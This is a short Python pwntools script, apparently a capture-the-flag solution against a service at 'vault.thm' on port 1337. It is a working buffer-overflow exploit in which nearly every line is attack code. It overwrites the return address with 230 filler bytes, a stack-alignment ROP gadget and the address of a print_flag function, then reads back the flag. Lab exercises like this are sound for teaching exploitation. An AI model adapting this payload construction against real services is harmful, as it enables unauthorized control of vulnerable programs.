from pwn import *

# --- Config ---
HOST = "vault.thm"
PORT = 1337

# Binary layout (from your local analysis)
OFFSET     = 230
PRINT_FLAG = 0x40119c          # nm ./vault | grep print_flag
ADJ        = 0x401012          # ROP gadget: add rsp, 8 ; ret  (for alignment)

# --- Build payload ---
payload  = b"A" * OFFSET
payload += p64(ADJ)                   # adjust stack, then ret
payload += p64(0xdeadbeefdeadbeef)    # skipped by 'add rsp,8'
payload += p64(PRINT_FLAG)            # land in print_flag()

def main():
    # Optional: show details
    context.log_level = "info"
    log.info(f"Payload length: {len(payload)} bytes")

    # Connect & send
    p = remote(HOST, PORT)
    # Service prints a banner first, then asks:
    # "Username: "
    p.sendlineafter(b"Username:", payload)

    # Show everything it prints (flag should appear)
    out = p.recvall(timeout=3)
    print(out.decode(errors="ignore"))

if __name__ == "__main__":
    main()

